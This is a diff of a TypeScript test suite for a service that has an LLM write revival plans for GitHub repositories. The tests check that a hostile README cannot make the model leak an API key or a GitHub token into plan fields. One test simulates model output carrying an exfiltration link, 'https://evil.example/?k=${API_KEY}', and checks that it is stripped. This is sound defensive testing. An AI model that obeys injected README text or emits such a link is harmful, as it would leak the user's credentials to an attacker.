@@ -6,6 +6,7 @@ import type { LlmClient } from "@/lib/llm";
 
 import { CAUSE_CODES } from "@/lib/epitaphs";
 import { RevivalPlanSchema } from "./plan";
+import { makePlan, VALID_PLAN, VALID_PLAN_TEXT } from "./plan.fixtures";
 import { extractDataBlock, SYSTEM_PROMPT } from "./prompt";
 import type { ReadRequester } from "./read-only";
 import { resurrect, type ResurrectOutcome } from "./service";
@@ -33,14 +34,7 @@ const META = {
   owner: { login: "octocat" },
 };
 
-const VALID_PLAN = {
-  diagnosis: "Paused with a clear next step.",
-  smallestNextStep: "Run the project once.",
-  effort: "a weekend",
-  issueTitle: "Revive todo-app",
-  issueBody: "Intro.\n\n- [ ] Run it",
-};
-const VALID_TEXT = JSON.stringify(VALID_PLAN);
+const VALID_TEXT = VALID_PLAN_TEXT;
 
 class HttpError extends Error {
   constructor(readonly status: number) {
@@ -209,13 +203,16 @@ describe("resurrect with a hostile README and known secrets", () => {
     expect(t.gh.routes.every((r) => r.startsWith("GET "))).toBe(true);
   });
 
-  const echoed = JSON.stringify({
-    ...VALID_PLAN,
-    diagnosis: `Key ${API_KEY} and token ${GH_TOKEN}`,
-    smallestNextStep: `Use ${API_KEY}`,
-    issueTitle: `Token ${GH_TOKEN}`,
-    issueBody: `- [ ] ${API_KEY}\n- [ ] ${GH_TOKEN}`,
-  });
+  const echoed = JSON.stringify(
+    makePlan({
+      diagnosis: `Key ${API_KEY} and token ${GH_TOKEN}`,
+      issue: {
+        title: `Token ${GH_TOKEN}`,
+        body: `- [ ] ${API_KEY}\n- [ ] ${GH_TOKEN}\n- [ ] x`,
+        labels: ["revival"],
+      },
+    }),
+  );
 
   it("(b) model echoes secrets into plan fields twice: rejected, fallback", async () => {
     const t = run([{ text: echoed }], { readme: HOSTILE_README, secrets });
@@ -233,8 +230,36 @@ describe("resurrect with a hostile README and known secrets", () => {
     assertNoSecrets(outcome);
   });
 
+  it.each([
+    ["a roadmap step", (s: string) => makePlan({ roadmap: [{ ...VALID_PLAN.roadmap[0], why: s }, ...VALID_PLAN.roadmap.slice(1)] })],
+    ["a quick win", (s: string) => makePlan({ quickWins: [s, "b"] })],
+    ["a risk", (s: string) => makePlan({ risks: [s] })],
+    ["the verdict reason", (s: string) => makePlan({ verdict: { decision: "revive", reason: s } })],
+    ["a label", (s: string) => makePlan({ issue: { ...VALID_PLAN.issue, labels: [s] } })],
+    ["the effort total", (s: string) => makePlan({ effort: { level: "low", total: s } })],
+  ])("(b4) a secret in %s is rejected, fallback", async (_name, build) => {
+    const bad = JSON.stringify(build(API_KEY));
+    const t = run([{ text: bad }], { readme: HOSTILE_README, secrets });
+    const outcome = await t.promise;
+    expectFallback(outcome, "llm_invalid_output");
+    assertNoSecrets(outcome);
+  });
+
+  it("(b5) a hostile README that makes the model add a link still gives a valid plan with no secret", async () => {
+    const linked = JSON.stringify(
+      makePlan({ diagnosis: `Fine. See https://evil.example/?k=${API_KEY} and [x](http://evil.example).` }),
+    );
+    const t = run([{ text: linked }], { readme: HOSTILE_README, secrets });
+    const outcome = await t.promise;
+    expect(RevivalPlanSchema.safeParse(outcome.plan).success).toBe(true);
+    expect(JSON.stringify(outcome)).not.toMatch(/evil\.example|https?:/);
+    assertNoSecrets(outcome);
+  });
+
   it("(b3) a secret in the effort-independent title alone is rejected", async () => {
-    const one = JSON.stringify({ ...VALID_PLAN, issueTitle: `T ${GH_TOKEN}` });
+    const one = JSON.stringify(
+      makePlan({ issue: { ...VALID_PLAN.issue, title: `T ${GH_TOKEN}` } }),
+    );
     const t = run([{ text: one }], { readme: HOSTILE_README, secrets });
     const outcome = await t.promise;
     expectFallback(outcome, "llm_invalid_output");
